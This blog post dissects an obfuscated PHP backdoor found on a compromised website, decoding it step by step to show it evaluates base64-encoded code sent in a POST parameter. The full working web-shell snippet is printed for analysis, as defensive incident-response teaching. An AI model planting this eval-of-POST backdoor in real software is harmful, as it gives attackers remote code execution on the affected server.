---
layout: post
title: Anatomy of a PHP Hack
tags:
- PHP
- Security
---
It's hard to come up with a title for this - but - basically I found some rogue code the other day that I thought was pretty interesting. I was fixing a "hacked" website when I came across the source of the symptoms of the hack.  One file had the following code in it:

```php?start_inline=1
$zgjv56 = "o_esb4da6ctp" ; 
$fzba02= strtolower( $zgjv56[4].$zgjv56[7].$zgjv56[3].$zgjv56[2] . $zgjv56[8].$zgjv56[5].$zgjv56[1] . $zgjv56[6]. $zgjv56[2].$zgjv56[9].$zgjv56[0].$zgjv56[6].$zgjv56[2] );
$gfc4 =strtoupper ( $zgjv56[1]. $zgjv56[11].$zgjv56[0]. $zgjv56[3].$zgjv56[10] ) ; 
if( isset( ${ $gfc4 }['n89024b' ] )){
    eval( $fzba02 (${$gfc4 } [ 'n89024b' ] )) ;
}
```

This obfuscated code is doing something bad, but we don't know what at first glance.  Obviously, the solution is to remove it - but - aren't you a little curious what it was doing?  Let's take a look.

First, the `$zgjv56` variable has unique letters and numbers and an underscore.  It looks like `$fzba02` is created by picking out various offsets (remember, you can access a character of a PHP string in the same manner as you might query an array index).   It's weird that it's calling `strtolower()` though - because all the values are lower.  So, let's figure out what the value of `$fzba02` actually is.

> Important note: When you're testing PHP code that you're unsure of, run it in a sandboxed virtual machine that has no access to the internet or your local device.

```
php > $zgjv56 = "o_esb4da6ctp";
php > $fzba02= strtolower( $zgjv56[4].$zgjv56[7].$zgjv56[3].$zgjv56[2] . $zgjv56[8].$zgjv56[5].$zgjv56[1] . $zgjv56[6]. $zgjv56[2].$zgjv56[9].$zgjv56[0].$zgjv56[6].$zgjv56[2] );
php > echo $fzba02;
base64_decode
```

Ah - so the variable is the value `base64_decode` - nice.  

> Why random variable names and why `base64_decode`? The random variable names make it harder to understand what the code is doing. It's like the difference between using `$counter` and `$c` - one is more obvious than the other.  The base 64 encoding is done most likely for a weak obfuscation attempt again.

The next line creates another variable based off of our initial string - let's check it out:

```
php > $gfc4 =strtoupper ( $zgjv56[1]. $zgjv56[11].$zgjv56[0]. $zgjv56[3].$zgjv56[10] ) ;
php > echo $gfc4;
_POST
```

So, this variable is targeting the magic/global PHP variable `$_POST` - ok - I'm starting to get a picture of what we may figure out next.  There is something that will be base 64 encoded and posted to this script.

This PHP line gives us the indicator of what wakes up the script:

```php?start_inline=1
if( isset( ${ $gfc4 }['n89024b' ] )){

// translates to:
if (isset($_POST['n89024b'])) {
```

Again, a random variable/string in `n89024b` - but this says - if there is a post request to this page using the variable `n89024b` - we should do something.  That variable name is very likely not to be picked by the main application - so it's safe for this script to accept/intercept those values and do it's task.

```php?start_inline=1
eval( $fzba02 (${$gfc4 } [ 'n89024b' ] )) ;

// translates to
eval(base64_decode($_POST['n89024b']));
```

Whenever you see `eval()` you should be afraid - but what is this really doing?  Its basically taking anything that is posted in a base 64 encoding with a specific variable and executing it directly in the context of this script.  This obfuscated script indicates that the user of this basically had free reign to run anything on the server at any time.  The easy fix is removing this code - the hard part is figuring out what / if they used this for other nefarious purposes on your server.
